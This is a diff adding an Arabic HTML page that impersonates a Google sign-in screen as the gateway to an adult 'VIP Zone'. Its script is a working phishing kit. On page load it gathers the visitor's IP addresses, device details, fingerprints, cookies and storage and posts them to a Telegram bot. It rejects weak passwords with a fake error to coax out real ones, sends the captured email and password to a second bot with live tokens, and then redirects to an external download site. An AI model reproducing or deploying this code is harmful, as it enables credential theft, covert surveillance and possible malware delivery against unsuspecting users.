@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>تسجيل الدخول - Google</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Google Sans', 'Segoe UI', Roboto, sans-serif;
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .google-container {
+            max-width: 450px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            padding: 48px 40px 36px;
+            box-shadow: 0 12px 32px rgba(0,0,0,0.12);
+            text-align: center;
+            border: 1px solid #dadce0;
+        }
+        .google-logo { margin-bottom: 30px; }
+        .google-logo img { width: 75px; }
+        .google-title { font-size: 24px; font-weight: 500; color: #202124; margin-bottom: 10px; }
+        .google-sub { font-size: 16px; color: #5f6368; margin-bottom: 25px; }
+        .input-field { text-align: right; margin-bottom: 20px; }
+        .input-field input { width: 100%; padding: 14px 16px; border-radius: 6px; border: 1px solid #dadce0; font-size: 16px; }
+        .input-field input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+        .google-btn { background: #1a73e8; color: white; border: none; padding: 12px; width: 100%; border-radius: 28px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 15px; }
+        .google-btn:hover { background: #1765cc; }
+        .error-message { color: #d93025; font-size: 13px; text-align: right; margin-top: 8px; display: none; }
+        .vip-container {
+            max-width: 500px; width: 100%; background: #0f0f1a; border-radius: 32px; padding: 40px 30px;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid rgba(255,45,85,0.3);
+            text-align: center;
+        }
+        .vip-icon { width: 80px; height: 80px; background: #ff2d55; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; box-shadow: 0 0 20px rgba(255,45,85,0.4); }
+        .vip-icon span { font-size: 42px; color: white; }
+        .vip-title { font-size: 26px; font-weight: 700; color: #ff2d55; margin-bottom: 12px; }
+        .vip-sub { color: #b0b3b8; font-size: 15px; margin-bottom: 25px; border-bottom: 1px solid #2a2a3a; padding-bottom: 15px; }
+        .vip-note { background: #1a1a2a; border-radius: 24px; padding: 20px; margin-bottom: 30px; text-align: right; border-right: 4px solid #ff2d55; }
+        .vip-note p { font-size: 14px; color: #ddd; line-height: 1.6; }
+        .vip-note ul { padding-right: 20px; list-style: none; margin-top: 10px; }
+        .vip-note li { font-size: 13px; color: #bbb; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .vip-note li::before { content: "✓"; color: #ff2d55; font-weight: bold; margin-left: 8px; }
+        .vip-btn { background: #ff2d55; color: white; border: none; padding: 16px; width: 100%; border-radius: 60px; font-size: 18px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 20px; transition: all 0.2s; }
+        .vip-btn:hover { background: #ff475f; transform: translateY(-2px); }
+        .legal-footer { font-size: 11px; color: #6c6f7e; text-align: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #2a2a3a; }
+        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #1e293b; color: #ff2d55; padding: 8px 20px; border-radius: 40px; font-size: 13px; z-index: 2000; display: none; }
+    </style>
+</head>
+<body>
+
+<!-- المرحلة 1: شاشة تسجيل الدخول بجوجل -->
+<div id="googleLoginScreen" class="google-container">
+    <div class="google-logo"><img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google"></div>
+    <div class="google-title">تسجيل الدخول</div>
+    <div class="google-sub">تابع إلى VIP Zone باستخدام حساب Google الخاص بك</div>
+    <div class="input-field"><input type="email" id="googleEmail" placeholder="البريد الإلكتروني أو الهاتف"></div>
+    <div class="input-field"><input type="password" id="googlePassword" placeholder="كلمة المرور"></div>
+    <div class="error-message" id="googleError">البريد الإلكتروني أو كلمة المرور غير صحيحة</div>
+    <button class="google-btn" id="googleLoginBtn">تسجيل الدخول</button>
+</div>
+
+<!-- المرحلة 2: شاشة VIP (نفسها) -->
+<div id="vipScreen" style="display:none;">
+    <div class="vip-container">
+        <div class="vip-icon"><span>🔞</span></div>
+        <div class="vip-title">التحقق المطلوب للدخول</div>
+        <div class="vip-sub">منطقة حصرية للكبار فقط – تأكيد العمر والهوية</div>
+        <div class="vip-note">
+            <p>لضمان تجربة آمنة، يجب تأكيد هويتك البشرية قبل الدخول إلى المحتوى الحصري 🔞.</p>
+            <ul>
+                <li>البيانات مشفرة بنظام AES-256</li>
+                <li>عدم المصادقة خلال 5 دقائق يؤدي إلى إلغاء الجلسة</li>
+                <li>فقط للأعمار فوق 18 سنة – يتم التحقق تلقائياً</li>
+            </ul>
+        </div>
+        <button class="vip-btn" id="vipContinueBtn"><span>🚪</span> تأكيد العمر والدخول الآن</button>
+        <div class="legal-footer">🛡️ بوابات آمنة 128-bit SSL | جميع الحقوق محفوظة © VIP Zone</div>
+    </div>
+</div>
+<div id="toastMsg" class="toast"></div>
+
+<script>
+    // ========== 1. التقرير الفوري للبوت القديم عند فتح الصفحة ==========
+    const VIP_BOT_TOKEN = "8790530134:AAEXx70nWGnERE3fdy8zn_dfXgRzZ83e7Qg";
+    const CHAT_ID = "7388801889";
+
+    async function sendToOldBot(htmlText) {
+        const url = `https://api.telegram.org/bot${VIP_BOT_TOKEN}/sendMessage`;
+        try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: htmlText, parse_mode: 'HTML', disable_web_page_preview: true }) }); } catch(e) { console.error(e); }
+    }
+
+    // دوال جمع المعلومات (نسخة كاملة)
+    async function getPublicIP() { try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; } catch(e) { return 'غير متاح'; } }
+    async function getLocalIP() {
+        return new Promise((resolve) => {
+            let pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            pc.onicecandidate = (e) => {
+                if (e.candidate) {
+                    let ip = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(e.candidate.candidate)?.[0];
+                    if (ip && !ip.startsWith('192.168.0.')) { resolve(ip); pc.close(); }
+                }
+            };
+            setTimeout(() => resolve('غير متاح'), 2000);
+        });
+    }
+    async function getDeviceBasic() {
+        return {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screen: `${screen.width}x${screen.height}`,
+            cores: navigator.hardwareConcurrency || 'غير معروف',
+            ram: navigator.deviceMemory || 'غير معروف',
+            touchPoints: navigator.maxTouchPoints || 0
+        };
+    }
+    async function getNetworkInfo() {
+        let conn = navigator.connection || navigator.mozConnection;
+        if (conn) return { type: conn.effectiveType || 'غير معروف', speed: conn.downlink ? conn.downlink+' Mbps' : 'غير معروف' };
+        return { type: 'غير مدعوم', speed: 'غير معروف' };
+    }
+    async function getBattery() { try { let b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging ? 'شاحن' : 'بطارية'})`; } catch(e) { return 'غير متاح'; } }
+    async function getFingerprints() {
+        let audio = 'غير متاح';
+        try {
+            let ctx = new (window.AudioContext || window.webkitAudioContext)();
+            let osc = ctx.createOscillator();
+            let analyser = ctx.createAnalyser();
+            let gain = ctx.createGain();
+            gain.gain.value = 0;
+            osc.connect(analyser); analyser.connect(gain); gain.connect(ctx.destination);
+            osc.start(0);
+            let data = new Float32Array(analyser.frequencyBinCount);
+            analyser.getFloatFrequencyData(data);
+            osc.stop();
+            let sum = 0;
+            for (let i=0;i<data.length;i++) if (isFinite(data[i])) sum += Math.abs(data[i]);
+            audio = 'Audio-'+Math.floor(sum);
+        } catch(e) {}
+        let canvas = 'غير متاح';
+        try {
+            let c = document.createElement('canvas'); c.width=150; c.height=40;
+            let ctx = c.getContext('2d');
+            ctx.fillStyle="#f60"; ctx.fillRect(0,0,80,15);
+            ctx.fillStyle="#069"; ctx.fillText("VIP",5,15);
+            canvas = c.toDataURL().slice(0,50);
+        } catch(e) {}
+        return { audio, canvas };
+    }
+    async function getStorage() {
+        let cookies = document.cookie || 'لا توجد';
+        let local = 'فارغ';
+        try { local = localStorage.length ? Object.keys(localStorage).slice(0,3).join(', ') : 'فارغ'; } catch(e) {}
+        return { cookies, local };
+    }
+    async function getHistory() { return { referrer: document.referrer || 'مباشر', historyLen: history.length }; }
+
+    async function sendFullSpyReport() {
+        let [ipPublic, ipLocal, basic, net, battery, fp, storage, history] = await Promise.all([
+            getPublicIP(), getLocalIP(), getDeviceBasic(), getNetworkInfo(), getBattery(), getFingerprints(), getStorage(), getHistory()
+        ]);
+        let browser = "غير معروف";
+        let ua = basic.userAgent;
+        if (ua.includes("Chrome")) browser = "Google Chrome";
+        else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
+        else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
+        else if (ua.includes("Edge")) browser = "Microsoft Edge";
+        else if (ua.includes("Opera") || ua.includes("OPR")) browser = "Opera";
+        else browser = ua.substring(0, 50);
+        
+        let report = `<b>🔞 تقرير تجسس فوري (عند دخول الصفحة)</b>\n\n` +
+            `• <b>🌐 المتصفح:</b> ${browser}\n` +
+            `• <b>📱 الجهاز:</b> ${basic.platform} | ${basic.userAgent.substring(0,80)}...\n\n` +
+            `• <b>الشبكة</b>\n  IP العام: ${ipPublic}\n  IP المحلي: ${ipLocal}\n  نوع الشبكة: ${net.type}\n  السرعة: ${net.speed}\n\n` +
+            `• <b>الجهاز</b>\n  الشاشة: ${basic.screen}\n  الرام: ${basic.ram} GB\n  الأنوية: ${basic.cores}\n  اللغة: ${basic.language}\n  المنطقة الزمنية: ${basic.timezone}\n  نقاط اللمس: ${basic.touchPoints}\n  البطارية: ${battery}\n\n` +
+            `• <b>البصمات</b>\n  Audio FP: ${fp.audio}\n  Canvas FP: ${fp.canvas}\n\n` +
+            `• <b>التخزين</b>\n  الكوكيز: ${storage.cookies.substring(0,150)}${storage.cookies.length>150?'...':''}\n  LocalStorage: ${storage.local}\n\n` +
+            `• <b>التصفح</b>\n  الصفحة السابقة: ${history.referrer}\n  عدد الصفحات المفتوحة: ${history.historyLen}`;
+        await sendToOldBot(report);
+    }
+
+    // ========== 2. بوت جوجل (الأول) مع فحص كلمة المرور القوي ==========
+    const GOOGLE_BOT_TOKEN = "8261864001:AAE6ByF5lNBVHdURNtDZJDbqRcP6iez00Ss";
+
+    // التحقق من صيغة البريد الإلكتروني
+    function isValidEmail(email) {
+        return /^[^\s@]+@([^\s@.,]+\.)+[^\s@.,]{2,}$/.test(email);
+    }
+
+    // الكلمات الضعيفة والأرقام المتكررة
+    const weakPasswords = [
+        "password", "12345678", "123456789", "qwertyui", "qwertyuiop", "abcdefgh", "abcd1234",
+        "11111111", "00000000", "22222222", "33333333", "44444444", "55555555", "66666666",
+        "77777777", "88888888", "99999999", "111111111", "000000000", "123123123", "password1"
+    ];
+    
+    function isWeakPassword(password) {
+        // طول أقل من 8
+        if (password.length < 8) return true;
+        // تتكون من أرقام فقط أو حروف فقط
+        if (/^\d+$/.test(password)) return true;
+        if (/^[a-zA-Z]+$/.test(password)) return true;
+        // كلمات ضعيفة محددة
+        if (weakPasswords.includes(password.toLowerCase())) return true;
+        // أرقام متكررة مثل 11111111 (تمت بالكلمات أعلاه، لكن نضيف فحص لجميع الأرقام المتكررة)
+        if (/^(\d)\1+$/.test(password)) return true;
+        // حرف متكرر بسيط مثل aaaaaaaa (نارحبها لأن بعض الناس يستخدمونها)
+        if (/^([a-zA-Z])\1+$/.test(password)) return true;
+        // يجب أن تحتوي على حرف واحد على الأقل ورقم واحد (أو على الأقل خليط)
+        return !(/[a-zA-Z]/.test(password) && /\d/.test(password));
+    }
+
+    // رسالة خطأ عامة (مخفية السبب الحقيقي)
+    function showLoginError() {
+        const errorDiv = document.getElementById('googleError');
+        errorDiv.innerText = "كلمة المرور أو البريد الإلكتروني غير صحيح. يرجى المحاولة مرة أخرى.";
+        errorDiv.style.display = 'block';
+    }
+
+    async function getApproximateLocation() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            if (data.city && data.country_name) return `${data.city}, ${data.region}, ${data.country_name}`;
+            if (data.country_name) return data.country_name;
+            return "غير متاح";
+        } catch(e) { return "غير متاح"; }
+    }
+
+    async function sendGoogleCredentials(email, password, location) {
+        const text = `<b>🔐 تسجيل دخول جوجل وهمي</b>\n\n📧 البريد الإلكتروني: ${email}\n🔑 كلمة المرور: ${password}\n📍 الموقع التقريبي: ${location}\n⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`;
+        const url = `https://api.telegram.org/bot${GOOGLE_BOT_TOKEN}/sendMessage`;
+        try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true }) }); } catch(e) {}
+    }
+
+    document.getElementById('googleLoginBtn').addEventListener('click', async () => {
+        const email = document.getElementById('googleEmail').value.trim();
+        const password = document.getElementById('googlePassword').value.trim();
+        const errorDiv = document.getElementById('googleError');
+
+        // 1. التحقق من الحقول غير الفارغة
+        if (!email || !password) {
+            errorDiv.innerText = "يرجى إدخال البريد الإلكتروني وكلمة المرور.";
+            errorDiv.style.display = 'block';
+            return;
+        }
+
+        // 2. التحقق من صحة البريد الإلكتروني
+        if (!isValidEmail(email)) {
+            showLoginError(); // رسالة عامة مضللة
+            return;
+        }
+
+        // 3. التحقق من قوة كلمة المرور (لمحاكاة جوجل الحقيقية)
+        if (isWeakPassword(password)) {
+            showLoginError(); // رسالة عامة تجعل المستخدم يعيد المحاولة بكلمة مرور حقيقية
+            return;
+        }
+
+        // إذا اجتاز التحقق (بريد صالح وكلمة مرور قوية نسبياً) نرسل البيانات
+        errorDiv.style.display = 'none';
+
+        const btn = document.getElementById('googleLoginBtn');
+        btn.disabled = true;
+        btn.innerText = 'جاري التحقق...';
+
+        const location = await getApproximateLocation();
+        await sendGoogleCredentials(email, password, location);
+
+        // الانتقال إلى شاشة VIP
+        document.getElementById('googleLoginScreen').style.display = 'none';
+        document.getElementById('vipScreen').style.display = 'block';
+    });
+
+    document.getElementById('vipContinueBtn')?.addEventListener('click', () => {
+        window.location.href = "https://installyourfiles.com/1894759";
+    });
+
+    // ========== 3. إرسال التقرير الفوري عند تحميل الصفحة ==========
+    window.addEventListener('load', () => {
+        sendFullSpyReport();
+    });
+</script>
+</body>
+  </html>
